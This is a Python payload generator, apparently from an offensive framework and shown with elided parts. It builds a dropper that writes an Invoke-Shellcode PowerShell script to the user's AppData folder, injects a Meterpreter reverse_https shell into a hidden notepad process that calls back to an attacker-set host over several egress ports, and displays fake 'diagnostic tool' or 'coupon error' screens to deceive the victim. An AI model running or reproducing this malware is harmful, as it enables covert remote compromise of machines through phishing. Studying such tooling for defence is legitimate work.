...
class Payload:
    ...
    def __init__(self):
        ...
        self.required_options = {"compile_to_exe"   : ["Y", "Compile to an executable"],
                                 ...
                                 "LPORTS"       : ["443,53,9443,80", "Sequential, comma-separated list of port to try to egress from"],
                                 "TYPE"         : ["", "'Phish' or 'Pretext'"]
                                 }
    ...
    def generate(self):
        start="invoke='''"
        InvokeShellcode='''
function Global:Invoke-Shellcode
{
...
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    ...
    function Local:Get-ProcAddress
    {
        ...
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('%s%s')[-1].Equals('System.dll') }
    ...
    if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
    {
        if (!$PowerShell32bit) {
            ...
            $Execute = '$Command' + " | $Env:windir\SysWOW64\WindowsPowerShell%s%sv1.0\powershell.exe -NoProfile -Command -"
...
%s
%s
def payload_builder(lhost,lport):
    notepad_process=subprocess.Popen(['powershell.exe', '-ExecutionPolicy', 'Bypass', 
                                '-noprofile', 'Start-Process', 
                                'C:\Windows\SysWOW64%s%snotepad.exe', 
                                '-WindowStyle', 'Hidden'], shell=True)
    time.sleep(1)
    rawprocID=os.popen("cmd /c wmic process where (name like 'notepad.exe') get processid").read()
    procID=rawprocID.splitlines()
    f=str(procID[-2])
    pp=f.split()
    payload_process=subprocess.Popen(['powershell.exe', '-Version', '2', 
                                    '-ExecutionPolicy', 'Bypass', '-noprofile', 
                                    str(appdata)+'\ps.ps1;Invoke-Shellcode', 
                                    '-ProcessId', str(pp[0]), '-Payload', 
                                    'windows/meterpreter/reverse_https', 
                                    '-Lhost', str(lhost), '-Lport', str(lport), 
                                    '-Force'], shell=True)  
    return
...
def user_front():
    if mode == "Pretext":
        phish=subprocess.Popen(['powershell', '"$env:USERDOMAIN Diagnostic and UpdateTool";', 
        '"------------------------------------------------------------";',
        '"Testing connectivity and performing diagnostics.  Please wait.";',
        '" ";"Domain:    $env:USERDOMAIN";',
        '"User Account:  $env:USERNAME";',
        '"Server:    $env:LOGONSERVER";" ";start-sleep -s 7;',
        '"-Testing connection to $env:LOGONSERVER.";"Please wait.";',
        'start-sleep -s 2;"Successs!";" ";start-sleep -s 2;',
        '"-Testing connection to the Core system.";',
        '"Please wait.";start-sleep -s 2;"Success!";" ";',
        'start-sleep -s 3;"-Verifying Operating System patches.";',
        '"Please wait.";start-sleep -s 3;"Success!";" ";',
        'start-sleep -s 2;"-Verifying AntiVirus updates.";',
        '"Please wait.";start-sleep -s 7;"Success!";" ";',
        '"...Finishing, please wait.";start-sleep -s 4'])
    elif mode == "Phish":
        pretext=subprocess.Popen(['powershell', '$wshell = New-Object -ComObject', 
        'Wscript.Shell;$wshell.Popup("Error: Could not generate coupon on this workstation.', 
        'Please try again on a different computer.",0,"Generate Coupon Error",0x0 + 0x10);', 
        'start-sleep -s 3'], shell=True)

appdata=os.getenv('APPDATA')
file=open(str(appdata)+'\ps.ps1', 'wb')
file.write(bytes(invoke))
file.close()

user_front()

for tcpport in port_list:
    if tcp_test(tcpport):
        break

''' %(self.required_options["TYPE"][0], self.required_options["LPORTS"][0], self.required_options["LHOST"][0], start, InvokeShellcode, end, "\\", "\\")
